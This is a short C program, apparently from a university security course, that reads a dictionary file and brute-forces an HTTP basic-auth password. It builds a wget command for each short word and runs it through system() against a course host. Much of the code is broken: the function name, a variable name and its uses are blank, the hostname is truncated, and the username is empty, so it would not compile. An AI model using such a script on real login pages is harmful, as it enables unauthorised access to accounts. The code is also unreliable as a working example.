




#include <stdio.h>
#include <stdlib.h>
#include <time.h>


int ()

{
   int cntr=0;
   char get[96];
   char username[]="";
   char password[16];
   int R_VALUE;
   double time_used;
   clock_t , end;
  
   FILE* fp;
   fp = fopen("/usr/share/lib/dict/words","r");
     
    = clock();
  
       while ( fscanf(fp,"%s",&password) != EOF )
	   {
        
		  
		  if(strlen(password)>3) continue;
		   
		        cntr++;
                printf("%d          >> PASSWORD SEND : %s \n",cntr, password);
              
				sprintf(get,"wget --http-user=%s --http-passwd=%s http://sec-crack.cs.rmit.edu./SEC/2/",username,password);
                
  
                R_VALUE=system(get);
          
	            if(R_VALUE==0)
				{
		         printf("The Password has been cracked and it is : %s" , password);
		         exit(0);
				}

	   }

	   
  end = clock();
  time_used = ((double) (end - )) / CLOCKS_PER_SEC;
  printf("time_used = %f\n", time_used);

}



